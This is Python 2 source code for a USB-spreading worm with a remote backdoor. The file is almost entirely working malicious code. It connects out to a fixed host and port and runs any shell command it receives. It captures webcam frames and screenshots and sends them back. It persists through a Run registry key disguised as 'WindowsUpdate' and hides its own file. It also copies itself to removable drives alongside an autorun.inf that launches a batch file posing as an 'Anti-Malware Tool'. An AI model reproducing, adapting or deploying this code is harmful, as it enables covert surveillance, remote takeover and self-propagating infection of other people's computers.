import os, socket, subprocess, cv2, numpy, sys, Image, ImageGrab, thread
        
host = 'localhost'
port = 7757

wormdir, worm = os.path.split(sys.argv[0])

USBPos = ['D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'J:\\', 'K:\\']
USBDir = []

lencount = len(USBPos)
lencount -= 1

#backdoor function
def backdoor():
    while True: 
        try:
            s = socket.socket()
            s.connect((host, port))

            while True:
                data = s.recv(1024)
                if data == 'quit': break
                
                elif data.startswith("cd") == True:
                    try:
                        os.chdir(data[3:])
                        stdout_value = ""
                    except:
                        stdout_value = "The system cannot find the path specified."
                   
                elif data == "webcam":
                   capture = cv2.VideoCapture(0)
                   ret, frame = capture.read()
                   cv2.imwrite("image.jpg", frame)
                   capture.release()
                   g = open("image.jpg", "rb")
                   stdout_value = g.read()
                   g.close()
                   os.remove("image.jpg")

                elif data == 'screenshot':
                    img = ImageGrab.grab()
                    img.save('screenshot.jpg')
                    h = open('screenshot.jpg', 'rb')
                    stdout_value = h.read()
                    h.close()
                    os.remove('screenshot.jpg')
                
                else:
                     proc= subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     stdout_value = proc.stdout.read() + proc.stderr.read()

                stdout_value = stdout_value+"\n"+os.getcwd()+">"
                s.send(stdout_value)
                
                

            s.close()

        except: pass    


#adding availale USBs to list
def scanUSBs(lencount):
    while lencount >= 0 :
        if os.path.exists(USBPos[lencount]):
            USBDir.append(USBPos[lencount])
            lencount -= 1
            
        else:
            lencount -= 1
            continue
    anyUSBs()

#checking if USB list is empty
def anyUSBs():
    if USBDir == []:
        print "No USBs detected at this time!!"
        backdoor()

    else:
        print ""
        copyWorm()

#so it copies on to the computer and run on startup
def checkAndrun():
    if os.path.isfile("%userprofile%\\"+worm):
        pass
    else:
        subprocess.call('copy ' + worm + ' %userprofile%' + '\\' + worm, shell=True)
        subprocess.call('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v WindowsUpdate /d %userprofile%' + '\\' + worm, shell=True)
        subprocess.call('attrib +s +r +h %userprofile%' + '\\' + worm, shell=True)
    

#copying bkd into USB and hide it
def copyWorm():
    USBCount = len(USBDir)
    USBCount -= 1
    while USBCount >= 0 :
        fulldir = os.path.join(USBDir[USBCount], worm)
        subprocess.call('copy ' + worm + " " + fulldir, shell=True)
        subprocess.call('attrib +s +h +r' + fulldir, shell=True)
        USBCount -=1
    autoRun()


#adding autorun file to usb to automatically execute a bat file that will copy the worm and add it to the registry of the remote computer.
def autoRun():
    USBCount = len(USBDir)
    USBCount -= 1
    while USBCount >= 0 :
        fullauto = os.path.join(USBDir[USBCount] , 'autorun.inf')
        fullbat = os.path.join(USBDir[USBCount], 'antivirus.bat')
        try:
            if os.name=='nt':
                fp = open(fullauto, 'w+')
                fp2 = open(fullbat, 'w+')
                bat1 = '@echo off'
                bat2 = 'copy ' + worm + ' %userprofile%' + '\\' + worm
                bat3 = 'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v WindowsUpdate /d %userprofile%' + '\\' + worm
                bat4 = 'attrib +s +r +h %userprofile%' + '\\' + worm
                auto1 = '[autorun]'
                auto2 = 'open = antivirus.bat' 
                auto3 = 'action = Anti-Malware Tool'
                fp2.write(bat1)
                fp2.write('\n')
                fp2.write(bat2)
                fp2.write('\n')
                fp2.write(bat3)
                fp2.write('\n')
                fp2.write(bat4)
                fp2.close()
                fp.write(auto1)
                fp.write('\n')
                fp.write(auto2)
                fp.write('\n')
                fp.write(auto3)
                fp.close()
                USBCount -=1

            else:
                break

        except IOError:
            USBCount -=1

    backdoor()

thread.start_new_thread(checkAndrun, ())
scanUSBs(lencount)

